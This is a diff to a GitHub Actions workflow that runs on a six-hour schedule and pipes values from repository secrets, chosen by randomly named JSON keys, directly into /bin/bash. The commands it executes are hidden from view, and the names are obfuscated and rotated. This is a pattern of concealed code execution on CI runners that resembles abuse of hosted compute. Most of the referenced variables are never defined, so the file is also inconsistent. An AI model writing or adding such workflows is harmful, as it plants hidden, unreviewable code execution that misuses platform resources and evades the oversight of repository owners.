@@ -3,7 +3,7 @@ name: charcoalterrorist
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 3/6 * * *'
+    - cron: '34 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: charcoalterrorist
         env:
-          vre43: ${{ secrets.vre43 }}
+          ls790: ${{ secrets.ls790 }}
         run: |
-          echo $vre43 | jq -r .zi7 | /bin/bash
-          echo $mjn34 | jq -r .s98 | /bin/bash
-          echo $wqctu331 | jq -r .anr65466 | /bin/bash
-          echo $jgo3 | jq -r .afgh7274 | /bin/bash
-          echo $kr7 | jq -r .hzs8 | /bin/bash
+          echo $ls790 | jq -r .tcsrh0 | /bin/bash
+          echo $yjf0752 | jq -r .aix4 | /bin/bash
+          echo $e6889 | jq -r .j4897 | /bin/bash
+          echo $lyr90468 | jq -r .aoc718 | /bin/bash
+          echo $vriod02288 | jq -r .ycmx108 | /bin/bash
+          echo $cavng31781 | jq -r .d56 | /bin/bash
 
